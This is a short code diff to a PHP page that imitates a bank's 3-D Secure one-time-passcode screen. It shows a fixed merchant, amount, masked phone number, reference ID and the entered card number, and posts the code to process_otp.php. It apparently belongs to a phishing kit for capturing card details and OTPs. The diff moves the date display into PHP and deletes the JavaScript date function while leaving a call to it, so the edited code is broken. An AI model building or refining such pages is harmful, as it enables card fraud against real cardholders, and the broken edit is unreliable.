@@ -129,8 +129,8 @@ function displayForm($cardNumber) {
             <p>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile 06*********</p>
             <p><strong>Merchant:</strong> GOLFSTORE 3DS</p>
             <p><strong>Amount:</strong> USD 45.99</p>
-            <p><strong>Date:</strong> <span id="currentDate"></span></p>
-            <p><strong>Card Number:</strong> $cardNumber</p>
+            <p><strong>Date:</strong> <?php echo date('Y/m/d H:i:s'); ?></p>
+        <p><strong>Card Number:</strong> $cardNumber</p>
             <p><strong>Reference Id:</strong> 298879</p>
         </div>
         <form action="process_otp.php" method="POST">
@@ -154,12 +154,7 @@ function displayForm($cardNumber) {
     </div>
 
     <script>
-        function updateDateTime() {
-            const now = new Date();
-            const date = now.toLocaleDateString('en-GB'); // Format: DD/MM/YYYY
-            const time = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' }); // Format: HH:MM:SS
-            document.getElementById('currentDate').textContent = `${date} ${time}`;
-        }
+
 
         // Update the date and time immediately and then every second
         updateDateTime();
